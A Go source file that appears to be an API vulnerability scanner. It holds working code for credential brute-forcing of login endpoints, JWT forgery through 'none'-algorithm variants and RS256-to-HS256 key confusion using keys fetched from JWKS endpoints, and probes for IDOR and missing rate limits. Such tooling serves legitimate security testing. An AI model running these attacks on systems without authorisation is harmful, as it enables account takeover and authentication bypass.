package main

import (
	"bufio"
	"bytes"
	"crypto/hmac"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/x509"
	"encoding/base64"
	"encoding/json"
	"encoding/pem"
	"fmt"
	"io"
	"math/big"
	"net/http"
	"net/url"
	"os"
	"strconv"
	"strings"
)

func readLineFromFile(filename string) []string {
	file, err := os.Open(filename)
	if err != nil {
		fmt.Println("Error:", err)
		return []string{}
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	var lines []string
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line == "" {
			continue
		}
		lines = append(lines, line)
	}

	if err := scanner.Err(); err != nil {
		fmt.Println("Error reading file:", err)
	}
	return lines
}

func testLogin_is_JWT(url string, paths []string) (string, User) {
	emails := readLineFromFile("emails.txt")
	passwords := readLineFromFile("passwords.txt")

	for _, path := range paths {
		if strings.Contains(strings.ToLower(path), "login") {
			for _, email := range emails {
				for _, password := range passwords {
					var credentials User
					credentials.SetEmail(email)
					credentials.SetPassword(password)
					jsonData, err := json.Marshal(credentials.GetJSON())
					if err != nil {
						fmt.Println(err)
					}
					req, err := http.NewRequest("POST", url+path, bytes.NewBuffer(jsonData))
					if err != nil {
						fmt.Println(err)
						return "", User{}
					}
					//fmt.Println("Request body", string(jsonData))

					req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:151.0) Gecko/20100101 Firefox/151.0")
					req.Header.Set("Referer", url+"/login")
					req.Header.Set("Content-Type", "application/json")
					req.Header.Set("Content-Length", strconv.Itoa(len(jsonData)))
					req.Header.Set("Origin", url)
					req.Header.Set("Connection", "keep-alive")
					req.Header.Set("Cookie", "chat_session_id=6012c3e0-8f24-45d7-9765-db79ee63ce88")

					client := &http.Client{}
					resp, err := client.Do(req)
					if err != nil {
						fmt.Println(err)
						return "", User{}
					}
					defer resp.Body.Close()

					//body, _ := io.ReadAll(resp.Body)
					//fmt.Println("Status:", resp.Status)
					if resp.StatusCode == 200 {
						//fmt.Println(string(body))
						return url + path, credentials
					}
				}
			}
		}
	}
	return "", User{}
}

// if response is 200 ok then
//check for authroization token exists or not

func testJWT(endpointURL string, paths []string, credentials User) (map[string]string, error) {
	var responseData JSON
	jsonData, err := json.Marshal(credentials.GetJSON())
	if err != nil {
		fmt.Println(err)
	}
	// if authorization toke exists then  test for different use cases
	req, err := http.NewRequest("POST", endpointURL, bytes.NewBuffer(jsonData))
	if err != nil {
		fmt.Println(err)
	}
	//fmt.Println("Request body", credentials)
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:151.0) Gecko/20100101 Firefox/151.0")
	req.Header.Set("Referer", endpointURL)
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("Content-Length", strconv.Itoa(len(jsonData)))
	req.Header.Set("Origin", endpointURL)
	req.Header.Set("Connection", "keep-alive")
	req.Header.Set("Cookie", "chat_session_id=6012c3e0-8f24-45d7-9765-db79ee63ce88")

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		println(err)
	}
	defer resp.Body.Close()

	bodyBytes, _ := io.ReadAll(resp.Body)
	if resp.StatusCode == 200 {
		// Convert JSON bytes -> JSON object

		err := json.Unmarshal(bodyBytes, &responseData)
		if err != nil {
			fmt.Println(err)
		}

		// Extract token
		token := responseData["token"].(string)

		// Extract bearer type
		bearerType := responseData["type"].(string)
		//capture the authroization token in string
		//fmt.Println("Token:", token)
		//fmt.Println("Bearer Type:", bearerType)

		//now Authenticated
		//1. test for none algorithm in differernt paths
		parsedURL, err := url.Parse(endpointURL)
		if err != nil {
			fmt.Println("invalid URL:", err)

		}
		url_org := parsedURL.Scheme + "://" + parsedURL.Host
		foundIssues, err := JWT_algo_none(url_org, paths, token, bearerType)
		fmt.Println("Testing JWT confusion Vulnerability...")
		foundconfustionIssues, err1 := JWT_confusion_attack(url_org, paths, token, bearerType)
		//2. test for confusion attacks
		if err != nil || err1 != nil {
			fmt.Println("Error testing JWT None Algorithm:", err)
			fmt.Println("Error testing JWT Confusion Attack:", err1)
		}
		//merge the found issues from both tests
		for k, v := range foundconfustionIssues {
			foundIssues[k] = v
		}
		if len(foundIssues) > 0 {
			return foundIssues, nil
		}
	}
	return nil, nil
}

func JWT_confusion_attack(url_org string, paths []string, token string, bearerType string) (map[string]string, error) {
	// find the jwk.json or .well-known/jwks.json
	foundIssues := make(map[string]string)
	found, KEY := findJWKSetEndpointAndReturnPEMKey(url_org)
	fmt.Println("found JWK Set endpoint : ", found, " RSA Key: ", KEY)
	if found {
		// Forge JWT with HS256 using the RSA public key as symmetric key
		parts := strings.Split(token, ".")
		if len(parts) != 3 {
			fmt.Println("Invalid JWT token format")
			return nil, fmt.Errorf("invalid JWT token format")
		}
		header := parts[0]
		payload := parts[1]
		// Decode header
		headerJSON, err := base64.RawURLEncoding.DecodeString(header)
		if err != nil {
			fmt.Println("Error decoding JWT header:", err)
			return nil, fmt.Errorf("error decoding JWT header: %v", err)
		}
		var headerData map[string]interface{}
		err = json.Unmarshal(headerJSON, &headerData)
		if err != nil {
			fmt.Println("Error parsing JWT header JSON:", err)
			return nil, fmt.Errorf("error parsing JWT header JSON: %v", err)
		}
		// Change alg to HS256
		headerData["alg"] = "HS256"
		modifiedHeaderJSON, err := json.Marshal(headerData)
		if err != nil {
			fmt.Println("Error encoding modified JWT header:", err)
			return nil, fmt.Errorf("error encoding modified JWT header: %v", err)
		}
		modifiedHeader := base64.RawURLEncoding.EncodeToString(modifiedHeaderJSON)
		// Compute signature
		message := modifiedHeader + "." + payload
		h := hmac.New(sha256.New, []byte(KEY))
		h.Write([]byte(message))
		signature := base64.RawURLEncoding.EncodeToString(h.Sum(nil))
		forgedToken := message + "." + signature

		// Now test the endpoints with this forged token
		baseURL := url_org
		methods := []string{"GET", "POST", "PUT", "PATCH", "DELETE"}
		for _, path := range paths {
			for _, method := range methods {
				fullURL := strings.TrimRight(baseURL, "/") + "/" + strings.TrimLeft(path, "/")
				req, err := http.NewRequest(method, fullURL, nil)
				if err != nil {
					continue
				}
				req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:151.0) Gecko/20100101 Firefox/151.0")
				req.Header.Set("Referer", baseURL)
				req.Header.Set("Content-Type", "application/json")
				req.Header.Set("Authorization", strings.TrimSpace(bearerType+" "+forgedToken))
				req.Header.Set("Connection", "keep-alive")
				req.Header.Set("Cookie", "chat_session_id=6012c3e0-8f24-45d7-9765-db79ee63ce88")

				client := &http.Client{
					CheckRedirect: func(req *http.Request, via []*http.Request) error {
						return http.ErrUseLastResponse
					},
				}
				resp, err := client.Do(req)
				if err != nil {
					continue
				}
				defer resp.Body.Close()

				if resp.StatusCode == 200 {
					// print the token and decoded header and payload for debugging
					foundIssues["Endpoint"] = fullURL
					foundIssues["Issue"] = "Possible JWT Confusion Vulnerability, method: " + method
					foundIssues["Token"] = forgedToken
					return foundIssues, nil
				}
			}
		}
	}
	return foundIssues, nil
}

func findJWKSetEndpointAndReturnPEMKey(url_org string) (bool, string) {
	// common endpoints for JWK Set
	//read the JWK Set endpoints from the file
	// Parse base URL (scheme + host)
	parsedURL, err := url.Parse(url_org)
	if err != nil {
		fmt.Println("invalid URL:", err)
	}
	baseURL := parsedURL.Scheme + "://" + parsedURL.Host

	jwkEndpoints := readLineFromFile("JWKSet_endpoints.txt")
	for _, endpoint := range jwkEndpoints {
		fmt.Println("Testing JWK Set endpoint:", endpoint)
		fullURL := strings.TrimRight(baseURL, "/") + "/" + strings.TrimLeft(endpoint, "/")
		resp, err := http.Get(fullURL)
		if err != nil {
			fmt.Println("Error fetching JWK Set endpoint:", fullURL, "Error:", err)
			continue
		}
		//prin the response status code
		//fmt.Println("Testing JWK Set endpoint:", fullURL, "Status Code:", resp.StatusCode)

		//print the response body if the status code is 200
		if resp.StatusCode == 200 {
			bodyBytes, _ := io.ReadAll(resp.Body)
			var jwkData map[string]interface{}

			err := json.Unmarshal(bodyBytes, &jwkData)
			if err != nil {
				fmt.Println("Error parsing JWK Set JSON:", err)
				return false, ""
			}
			keys, ok := jwkData["keys"].([]interface{})
			if !ok || len(keys) == 0 {
				fmt.Println("No keys found in JWK Set")
				continue
			}
			for _, keyInterface := range keys {
				key, ok := keyInterface.(map[string]interface{})
				if !ok {
					continue
				}
				if key["kty"] != "RSA" {
					continue
				}
				// Extract n and e
				nStr, ok := key["n"].(string)
				if !ok {
					continue
				}
				eStr, ok := key["e"].(string)
				if !ok {
					continue
				}
				// Decode base64url
				nBytes, err := base64.RawURLEncoding.DecodeString(nStr)
				if err != nil {
					fmt.Println("Error decoding n:", err)
					continue
				}
				eBytes, err := base64.RawURLEncoding.DecodeString(eStr)
				if err != nil {
					fmt.Println("Error decoding e:", err)
					continue
				}
				n := new(big.Int).SetBytes(nBytes)
				e := int(new(big.Int).SetBytes(eBytes).Int64())
				pubKey := &rsa.PublicKey{N: n, E: e}
				derBytes, err := x509.MarshalPKIXPublicKey(pubKey)
				if err != nil {
					fmt.Println("Error marshaling public key:", err)
					continue
				}
				pemBlock := &pem.Block{Type: "PUBLIC KEY", Bytes: derBytes}
				pemString := string(pem.EncodeToMemory(pemBlock))
				//fmt.Println("Found RSA key and converted to PEM", pemString)
				return true, pemString
			}

		}
	}
	return false, ""
}

func JWT_algo_none(url_org string, paths []string, token string, bearerType string) (map[string]string, error) {

	foundIssues := make(map[string]string)

	// methods
	methods := [...]string{"GET", "POST", "PUT", "PATCH", "DELETE"}

	// Parse base URL (scheme + host)
	parsedURL, err := url.Parse(url_org)
	if err != nil {
		fmt.Println("invalid URL:", err)
		return nil, err
	}
	baseURL := parsedURL.Scheme + "://" + parsedURL.Host

	//paths
	//fmt.Println(" base url : ", baseURL)
	for _, path := range paths {
		for _, method := range methods {
			//construction the request
			//fmt.Println(" method type : ", method)
			for _, keyword := range []string{"", "nONE", "None", "NoNE", "NONE", "nOnE", "NoNe", "none"} {

				// Build full URL from base and path
				fullURL := strings.TrimRight(baseURL, "/") + "/" + strings.TrimLeft(path, "/")
				req, err := http.NewRequest(method, fullURL, nil)
				if err != nil {
					fmt.Println(err)
					continue
				}
				//token manipulation
				//decode the JWT token
				parts := strings.Split(token, ".")
				if len(parts) != 3 {
					fmt.Println("Invalid JWT token format")
					continue
				}
				header := parts[0]
				payload := parts[1]
				signature := parts[2]
				//change the alg to none
				headerJSON, err := base64.RawURLEncoding.DecodeString(header)
				if err != nil {
					fmt.Println("Error decoding JWT header:", err)
					continue
				}
				var headerData map[string]interface{}
				err = json.Unmarshal(headerJSON, &headerData)
				if err != nil {
					fmt.Println("Error parsing JWT header JSON:", err)
					continue
				}
				headerData["alg"] = keyword
				modifiedHeaderJSON, err := json.Marshal(headerData)
				if err != nil {
					fmt.Println("Error encoding modified JWT header:", err)
					continue
				}
				modifiedHeader := base64.RawURLEncoding.EncodeToString(modifiedHeaderJSON)
				modifiedToken := modifiedHeader + "." + payload + "." + signature

				// Set headers
				req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:151.0) Gecko/20100101 Firefox/151.0")
				req.Header.Set("Referer", baseURL)
				req.Header.Set("Content-Type", "application/json")
				req.Header.Set("Authorization", strings.TrimSpace(bearerType+" "+modifiedToken))
				req.Header.Set("Connection", "keep-alive")
				req.Header.Set("Cookie", "chat_session_id=6012c3e0-8f24-45d7-9765-db79ee63ce88")

				client := &http.Client{
					CheckRedirect: func(req *http.Request, via []*http.Request) error {
						return http.ErrUseLastResponse
					},
				}
				resp, err := client.Do(req)
				if err != nil {
					fmt.Println("error :", err)
					continue
				}
				defer resp.Body.Close()
				//body, _ := io.ReadAll(resp.Body)
				//fmt.Println(" JWT request",method, path, " response code : ", resp.StatusCode)
				if resp.StatusCode == 200 {
					foundIssues["Endpoint"] = fullURL
					foundIssues["Issue"] = "Possible JWT None Algorithm Vulnerability, method: " + method + " used keyword : " + keyword
					foundIssues["Token"] = modifiedToken
				}
			}

		}
	}
	//return end point & issue
	return foundIssues, nil

}

func testIDOR(fullURL string, id int, authToken string) string {
	if id <= 0 {
		return ""
	}

	u, err := url.Parse(fullURL)
	if err != nil {
		return ""
	}

	url1 := buildPathURL(u, id)
	url2 := buildPathURL(u, id+1)

	r1, err1 := makeRequest(url1, authToken)
	if err1 != nil {
		return ""
	}
	defer r1.Body.Close()

	r2, err2 := makeRequest(url2, authToken)
	if err2 != nil {
		return ""
	}
	defer r2.Body.Close()

	if r1.StatusCode == 200 && r2.StatusCode == 200 {
		return "Possible IDOR via path parameter"
	}

	return ""
}

func buildPathURL(u *url.URL, id int) string {
	copyURL := *u
	copyURL.RawQuery = ""

	path := strings.Trim(copyURL.Path, "/")
	if path == "" {
		copyURL.Path = "/" + strconv.Itoa(id)
		return copyURL.String()
	}

	segments := strings.Split(path, "/")
	for i, seg := range segments {
		if _, err := strconv.Atoi(seg); err == nil {
			segments[i] = strconv.Itoa(id)
			copyURL.Path = "/" + strings.Join(segments, "/")
			return copyURL.String()
		}
	}

	segments = append(segments, strconv.Itoa(id))
	copyURL.Path = "/" + strings.Join(segments, "/")
	return copyURL.String()
}

func makeRequest(requestURL string, authToken string) (*http.Response, error) {
	req, err := http.NewRequest("GET", requestURL, nil)
	if err != nil {
		return nil, err
	}

	if authToken != "" {
		req.Header.Set("Authorization", "Bearer "+authToken)
	}

	client := &http.Client{}
	return client.Do(req)
}

func testAuth(url string) string {
	resp, err := http.Get(url)
	if err != nil {
		return ""
	}
	defer resp.Body.Close()

	if resp.StatusCode == 200 {
		return "No Authentication"
	}
	return ""
}

func testRateLimit(url string) string {
	for i := 0; i < 20; i++ {
		resp, err := http.Get(url)
		if err != nil {
			return ""
		}
		defer resp.Body.Close()

		if resp.StatusCode == 429 {
			return ""
		}
	}
	return "No Rate Limiting"
}
